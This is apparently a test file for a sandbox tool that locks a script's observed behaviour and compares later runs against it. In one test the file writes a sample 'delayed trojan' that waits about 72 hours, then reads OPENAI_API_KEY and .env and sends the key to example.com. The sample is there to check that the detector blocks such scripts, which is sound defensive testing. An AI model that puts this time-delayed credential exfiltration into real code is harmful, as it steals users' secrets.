import json
from pathlib import Path
import sys
import tempfile
import textwrap


sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
from differ import compare_with_lockfile
from lockfile import (build_lock_data, create_lockfile_for_script, get_file_sha256,
                      load_lockfile, normalize_path)
from runner import run_in_sandbox, run_multi_horizon


def make_script(folder, name, code):
    path = Path(folder, name)
    path.write_text(textwrap.dedent(code), encoding="utf-8")
    return path


def test_clean_lockfile_and_verification():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        Path(root, "data.txt").write_text("hello\n", encoding="utf-8")
        script = make_script(root, "app_v1.py", """
            import os
            with open('data.txt', encoding='utf-8') as fp:
                fp.read()
            os.getenv('APP_ENV', 'dev')
        """)
        lock_path = root / "nested" / "behavior.lock.json"
        lock = create_lockfile_for_script(script, lock_path=lock_path)
        assert load_lockfile(lock_path) == lock
        assert lock["capabilities"]["files_read"] == ["<PROJECT>/data.txt"]
        assert "APP_ENV" in lock["capabilities"]["env_vars_read"]
        assert lock["sha256"] == get_file_sha256(script)
        assert lock["horizons_locked"] == [0]
        assert str(root) not in lock_path.read_text(encoding="utf-8")

        run = run_multi_horizon(script, horizons_hours=[0, 24, 72])
        report = compare_with_lockfile(lock, run)
        assert report["risk_score"] == 0.0
        assert report["passed"] is True
        assert report["verdict"] == "WARNING"
        assert report['temporal_coverage_missing'] == [24, 72]
        assert report["findings"] == []
        assert report["file_hash_changed"] is False


def test_delayed_trojan_and_report():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        Path(root, "data.txt").write_text("hello\n", encoding="utf-8")
        first = make_script(root, "app_v1.py", """
            import os
            with open('data.txt', encoding='utf-8') as fp:
                fp.read()
            os.getenv('APP_ENV', 'dev')
        """)
        lock = create_lockfile_for_script(first, lock_path=root / "behavior.lock.json")
        trojan = make_script(root, "app_v2_trojan.py", """
            import os
            import time
            import urllib.request

            with open('data.txt', encoding='utf-8') as fp:
                fp.read()
            os.getenv('APP_ENV', 'dev')
            if time.time() - os.path.getmtime(__file__) >= 250000:
                key = os.getenv('OPENAI_API_KEY')
                with open('.env', encoding='utf-8') as fp:
                    fp.read()
                try:
                    urllib.request.urlopen('https://example.com/?key=' + key,
                                            timeout=0.2)
                except (OSError, ValueError):
                    pass
        """)
        run = run_multi_horizon(trojan, horizons_hours=[0, 24, 72])
        assert all(item["exit_code"] == 0 for item in run["runs"].values())
        report_path = root / "reports" / "latest_report.json"
        report = compare_with_lockfile(lock, run, report_out_path=report_path)
        assert report["file_hash_changed"] is True
        assert report["horizon_breakdown"]["0"]["risk_score"] == 0.0
        assert report["horizon_breakdown"]["72"]["risk_score"] == 100.0
        assert any(f["is_delayed_trigger"] and f["first_seen_hour"] == 72
                   and f["multiplier"] == 1.5 for f in report["findings"])
        assert report["passed"] is False
        assert report["verdict"] == "BLOCKED"
        assert json.loads(report_path.read_text(encoding="utf-8")) == report


def test_single_run_and_path_normalization():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        script = make_script(root, "sample.py", """
            with open('sample.py', encoding='utf-8') as fp:
                fp.read()
        """)
        run = run_in_sandbox(script)
        lock = build_lock_data(run)
        assert lock["horizons_locked"] == [0]
        assert lock["capabilities"]["files_read"] == []
        assert normalize_path(root / "data.txt", root) == "<PROJECT>/data.txt"
        assert normalize_path(Path.home() / ".ssh" / "id_rsa", root) == "<HOME>/.ssh/id_rsa"
        report = compare_with_lockfile(lock, run)
        assert report["risk_score"] == 0.0
        assert report["file_hash_changed"] is False


def test_canary_cannot_be_whitelisted():
    with tempfile.TemporaryDirectory() as tmp:
        root = Path(tmp)
        clean = make_script(root, "clean.py", "print('ok')\n")
        candidate = make_script(root, "sample.py", "import os\nprint(os.environ['OPENAI_API_KEY'])\n")
        lock = build_lock_data(run_in_sandbox(clean), project_root=root)
        run = run_in_sandbox(candidate)
        report = compare_with_lockfile(lock, run, project_root=root)
        assert any(f.get('channel') == 'stdout' for f in report['findings']
                       if f['category'] == 'canary_evidence')
        assert not any(f.get('channel') == 'network_attempt' for f in report['findings'])


if __name__ == "__main__":
    tests = (
        ("portable lockfile and clean verification", test_clean_lockfile_and_verification),
        ("delayed trojan and saved report", test_delayed_trojan_and_report),
        ("single run and path normalization", test_single_run_and_path_normalization),
        ("canary cannot be whitelisted", test_canary_cannot_be_whitelisted),
    )
    failed = 0
    for label, test in tests:
        try:
            test()
            print(f"PASS: {label}")
        except Exception as exc:
            failed += 1
            print(f"FAIL: {label}: {exc}")
    raise SystemExit(1 if failed else 0)
